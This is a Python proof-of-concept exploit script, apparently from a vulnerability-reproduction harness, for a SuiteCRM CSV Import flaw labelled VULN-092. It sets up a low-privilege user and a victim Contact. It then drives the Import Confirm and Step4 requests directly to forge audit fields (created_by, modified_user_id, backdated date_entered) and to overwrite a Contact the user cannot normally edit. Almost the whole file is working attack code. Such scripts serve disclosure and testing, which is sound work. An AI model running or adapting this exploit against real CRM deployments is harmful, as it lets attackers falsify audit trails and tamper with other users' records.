#!/usr/bin/env python3
"""
VULN-092 -- CSV Import forges audit/provenance metadata (mass assignment) AND
            updates records by id with no row-level ACL (IDOR).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink (a)   : modules/Import/Importer.php:518-571 (saveImportBean) -- flips
             update_date_modified/update_date_entered/update_modified_by/
             set_created_by based on which CSV columns were mapped, defeating
             SugarBean's normal system auto-stamping.
Sink (b)   : modules/Import/Importer.php:355-388 -- when `id` is mapped and
             import_type=update, the existing row is located by a raw
             `SELECT * FROM <table> WHERE id=...` and cloned/saved with NO
             ACLAccess('edit')/owner/SecurityGroup check on the TARGET row (only
             a module-level 'import' ACL is checked once, at controller entry --
             modules/Import/controller.php:80-86).

The classic-MVC Import wizard is normally driven by a multi-step UI (Step1/
Confirm/Step2/Step3/DupCheck/Step4); this script drives the two HTTP requests
that actually matter directly (source-verified from the view/controller code,
not guessed):
  1. POST module=Import&action=Confirm, multipart `userfile=<csv>` -- this is
     the ONLY step that actually moves the uploaded file into `upload://`
     (modules/Import/views/view.confirm.php:105-108, via UploadFile::final_move()).
     Its response HTML contains a hidden field `name="file_name"` with the
     resulting `upload://...` path (modules/Import/tpls/confirm.tpl:59) -- scraped
     here rather than assumed, so this script tracks the real code path exactly.
  2. POST module=Import&action=Step4 with `tmp_file=<scraped file_name>`,
     `columncount`, and `colnum_N=<field>` column mapping -- this is the step
     that actually instantiates Importer and calls ->import()
     (modules/Import/views/view.step4.php:91-92), synchronously running the
     whole importRow()/saveImportBean() pipeline against our uploaded CSV.
No header row is used in the CSV (avoids any ambiguity about header-skipping in
ImportFile/ImportFileSplitter); colnum_N maps column position N directly.

Plan
----
1. Admin creates low-priv RegularUser L, and gives L a throwaway Role that
   restricts Contacts 'edit' to ACL_ALLOW_OWNER (a realistic "data-entry user,
   own records only" deployment -- without this, a fresh install's default
   ACL_ALLOW_ALL for everyone would make "L can edit any Contact" unremarkable
   and not demonstrate a genuine bypass).
2. Admin creates victim Contact V (assigned_user_id=admin) -- outside L's ACL.
3. BASELINE: as L, attempt the normal edit path (legacy REST set_entry, which
   exercises the identical ACLAccess('save') gate EditView/Save uses) on V ->
   expect a "no access"/empty-id fault, proving the restriction is real.
4. PART (a) audit forgery: L imports a CSV creating a NEW Contact with
   last_name/created_by/date_entered/modified_user_id all attacker-controlled
   (created_by/modified_user_id forged to ADMIN's id, date_entered backdated to
   2010) -- verify via db the forged values survived.
5. PART (b) update-by-id IDOR: L imports a CSV with import_type=update mapping
   `id` (=V's id) and `last_name` (a new value) -- verify via db that V's
   last_name changed, despite L's Role denying L ordinary edit access to V.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, web_login, rest_login, rest_call, BROWSER_UA)
from _c1_common import db_rows, restrict_role, ACL_ALLOW_OWNER

VULN_ID = "VULN-092"
HERE = os.path.dirname(os.path.abspath(__file__))


def do_import(session, import_module, csv_bytes, colnum_map, extra=None):
    """Drive the two real HTTP steps: Confirm (uploads csv, returns file_name) then
    Step4 (actually runs Importer::import()). Returns (confirm_resp, step4_resp, file_name)."""
    files = {"userfile": ("import.csv", csv_bytes, "text/csv")}
    r_confirm = session.post(
        f"{BASE_URL}/index.php",
        data={"module": "Import", "action": "Confirm", "import_module": import_module,
              "custom_delimiter": ","},
        files=files,
        headers={"Referer": f"{BASE_URL}/index.php?module=Import&action=Step1&import_module={import_module}"},
        timeout=60,
    )
    m = re.search(r'name="file_name"\s+value="([^"]+)"', r_confirm.text)
    file_name = m.group(1) if m else None

    data = {
        "module": "Import", "action": "Step4", "import_module": import_module,
        "tmp_file": file_name or "", "custom_delimiter": ",", "custom_enclosure": "",
        "columncount": str(len(colnum_map)),
        # ImportDataSource::__get() (modules/Import/sources/ImportDataSource.php:337-347) reads
        # importlocale_* straight out of $_REQUEST when the ImportFile object itself has no such
        # property set (true here, since Step4 builds a bare `new ImportFile(...)` with no
        # setImportFileMap() call). Without these, ImportFieldSanitize's dateformat/timeformat are
        # NULL and ANY datetime value is rejected ("Invalid datetime") regardless of its format --
        # source-verified by inspecting upload/import/error_<uid>.csv after a failed attempt.
        # These three make the sanitizer accept plain ISO "Y-m-d H:i:s" values (harmless to include
        # even when no datetime column is mapped, as in PART (b) below).
        "importlocale_dateformat": "Y-m-d", "importlocale_timeformat": "H:i:s",
        "importlocale_timezone": "UTC",
    }
    for i, field in enumerate(colnum_map):
        data[f"colnum_{i}"] = field
    if extra:
        data.update(extra)
    r_step4 = session.post(f"{BASE_URL}/index.php", data=data,
                            headers={"Referer": f"{BASE_URL}/index.php?module=Import&action=Step3"},
                            timeout=90)
    return r_confirm, r_step4, file_name


def main():
    banner(VULN_ID, "CSV Import: audit-forgery (mass assignment) + update-by-id IDOR")
    log("INFO", "sink(a): modules/Import/Importer.php:518-571 (auto-stamp flag flips)")
    log("INFO", "sink(b): modules/Import/Importer.php:355-388 (update-by-id, no row ACL)")

    log("SETUP", "admin web + legacy REST session")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)
    admin_id = db_rows(f"SELECT id FROM users WHERE user_name='{ADMIN_USER}';")[0]["id"]

    log("SETUP", "create low-priv RegularUser L, restrict Contacts 'edit' to ACL_ALLOW_OWNER")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    low_id = low["id"]
    role_id = restrict_role(low_id, [("Contacts", "edit", ACL_ALLOW_OWNER)])
    log("OK", f"low-priv user {low['user_name']} id={low_id}; role {role_id} = Contacts edit OWNER-only")

    log("SETUP", "admin creates victim Contact V (assigned_user_id=admin) -- outside L's edit ACL")
    v_name = rand("Victim92")
    v_id = rest_call("set_entry", [admin_sid, "Contacts",
                      [{"name": "last_name", "value": v_name},
                       {"name": "assigned_user_id", "value": admin_id}]]).get("id")
    if not v_id:
        verdict(VULN_ID, "FAILED", "could not create victim Contact")
        sys.exit(1)
    log("OK", f"victim Contact V={v_id} ({v_name}) owned by admin")

    low_sid = rest_login(low["user_name"], low["password"])

    # --- BASELINE: L's normal edit path is genuinely blocked --------------------
    log("STEP", "baseline: L attempts normal set_entry edit on V (same ACLAccess('save') gate as EditView)")
    r_base = rest_call("set_entry", [low_sid, "Contacts",
                        [{"name": "id", "value": v_id}, {"name": "last_name", "value": "ShouldNotStick"}]])
    log("INFO", f"baseline set_entry response: {r_base}")
    baseline_id = r_base.get("id")
    baseline_blocked = (not baseline_id) or baseline_id in ("-1", "") or "error" in str(r_base).lower() \
        or "name" in r_base  # legacy REST fault shape has a 'name'/'number'/'description' fault
    row_unchanged = db_rows(f"SELECT last_name FROM contacts WHERE id='{v_id}';")
    baseline_effective = bool(row_unchanged) and row_unchanged[0]["last_name"] == v_name
    log("INFO", f"V's last_name after baseline attempt: {row_unchanged} (expect unchanged={v_name!r}) "
                f"-- baseline_blocked(api)={baseline_blocked} baseline_effective(db)={baseline_effective}")

    low_s = web_login(low["user_name"], low["password"])

    # --- PART (a): audit-forgery on CREATE ---------------------------------------
    a_name = rand("ForgedImp92")
    forged_date = "2010-01-01 00:00:00"
    csv_a = f"{a_name},{admin_id},{forged_date},{admin_id}\n".encode()
    log("STEP", f"PART(a): L imports a CSV creating a NEW Contact, forging "
                f"created_by=modified_user_id=<admin id> date_entered={forged_date!r}")
    r_confirm_a, r_step4_a, file_a = do_import(
        low_s, "Contacts", csv_a,
        colnum_map=["last_name", "created_by", "date_entered", "modified_user_id"],
    )
    log("INFO", f"(a) Confirm scraped file_name={file_a!r}; Step4 -> HTTP {r_step4_a.status_code}")

    rows_a = db_rows(
        "SELECT id, created_by, date_entered, modified_user_id FROM contacts "
        f"WHERE last_name='{a_name}' AND deleted=0;")
    log("PROOF", f"(a) new Contact row: {rows_a}")
    forged_created_by = bool(rows_a) and rows_a[0]["created_by"] == admin_id
    forged_modified_by = bool(rows_a) and rows_a[0]["modified_user_id"] == admin_id
    forged_date_entered = bool(rows_a) and rows_a[0]["date_entered"].startswith("2010-01-01")
    part_a_ok = forged_created_by and forged_modified_by and forged_date_entered
    log("INFO", f"(a) forged created_by={forged_created_by} modified_user_id={forged_modified_by} "
                f"date_entered={forged_date_entered} -> part_a_ok={part_a_ok} "
                f"(real importer was L, id={low_id}, NOT admin id={admin_id})")

    # --- PART (b): update-by-id IDOR ---------------------------------------------
    new_last_name = rand("Overwritten92")
    csv_b = f"{v_id},{new_last_name}\n".encode()
    log("STEP", f"PART(b): L imports import_type=update CSV mapping id=<V> last_name={new_last_name!r} "
                f"-- V is owned by admin, and L's Role denies L ordinary edit access to it")
    r_confirm_b, r_step4_b, file_b = do_import(
        low_s, "Contacts", csv_b,
        colnum_map=["id", "last_name"],
        extra={"import_type": "update"},
    )
    log("INFO", f"(b) Confirm scraped file_name={file_b!r}; Step4 -> HTTP {r_step4_b.status_code}")

    rows_b = db_rows(f"SELECT id, last_name, assigned_user_id FROM contacts WHERE id='{v_id}';")
    log("PROOF", f"(b) victim Contact V after import-update: {rows_b}")
    part_b_ok = bool(rows_b) and rows_b[0]["last_name"] == new_last_name
    log("INFO", f"(b) V's last_name now == forged value? {part_b_ok} (still owned by admin, "
                f"assigned_user_id unchanged: {bool(rows_b) and rows_b[0]['assigned_user_id'] == admin_id})")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "### baseline: L's normal edit attempt on V (legacy REST set_entry, expect blocked)\n"
            f"POST /service/v4_1/rest.php  method=set_entry  rest_data=[\"<L sid>\",\"Contacts\","
            f"[{{\"name\":\"id\",\"value\":\"{v_id}\"}},{{\"name\":\"last_name\",\"value\":\"ShouldNotStick\"}}]]\n\n"
            "### (a) audit-forgery import -- Confirm (multipart upload)\n"
            "POST /index.php  module=Import&action=Confirm&import_module=Contacts  "
            "+ multipart file field userfile=<csv: last_name,created_by,date_entered,modified_user_id>\n\n"
            "### (a) audit-forgery import -- Step4 (runs Importer::import())\n"
            f"POST /index.php  module=Import&action=Step4&import_module=Contacts&tmp_file={file_a}&"
            "columncount=4&colnum_0=last_name&colnum_1=created_by&colnum_2=date_entered&colnum_3=modified_user_id\n\n"
            "### (b) update-by-id IDOR import -- Confirm (multipart upload)\n"
            "POST /index.php  module=Import&action=Confirm&import_module=Contacts  "
            "+ multipart file field userfile=<csv: id,last_name>\n\n"
            "### (b) update-by-id IDOR import -- Step4 (runs Importer::import(), import_type=update)\n"
            f"POST /index.php  module=Import&action=Step4&import_module=Contacts&tmp_file={file_b}&"
            "columncount=2&colnum_0=id&colnum_1=last_name&import_type=update\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"baseline set_entry response: {r_base}\n\n"
                f"(a) Step4 HTTP {r_step4_a.status_code}\n"
                f"(b) Step4 HTTP {r_step4_b.status_code}\n")
    with open(os.path.join(HERE, "evidence", "db_rows.txt"), "w") as f:
        f.write(f"admin_id={admin_id} L={low_id} V={v_id}\n"
                f"baseline row_unchanged={row_unchanged}\n"
                f"(a) new forged-audit Contact rows={rows_a}\n"
                f"(b) V after update-by-id import={rows_b}\n")

    ok = baseline_effective and part_a_ok and part_b_ok
    if not ok:
        reasons = []
        if not baseline_effective:
            reasons.append("baseline: L's Role restriction did not actually block normal editing of V (setup invalid)")
        if not part_a_ok:
            reasons.append("(a) audit-forgery: created_by/date_entered/modified_user_id were NOT forged on the new Contact")
        if not part_b_ok:
            reasons.append("(b) update-by-id: V's last_name was not changed by the import (IDOR did not reproduce)")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "L (Contacts edit=OWNER-only, verified blocked from normally editing V) used CSV Import to "
              "(a) create a new Contact whose created_by/modified_user_id/date_entered are entirely "
              "attacker-chosen (admin's identity, 2010 timestamp), and (b) overwrite victim Contact V's "
              "last_name by id despite owning neither -- both bypass the SAME Role restriction that a "
              "normal Save correctly enforces.")
    verdict(VULN_ID, "CONFIRMED",
            f"(a) new Contact created_by=modified_user_id={admin_id[:8]}.. date_entered=2010-01-01 (forged); "
            f"(b) V={v_id[:8]}.. last_name overwritten to {new_last_name!r} by non-owning L (Role-bypassed)")
    sys.exit(0)


if __name__ == "__main__":
    main()
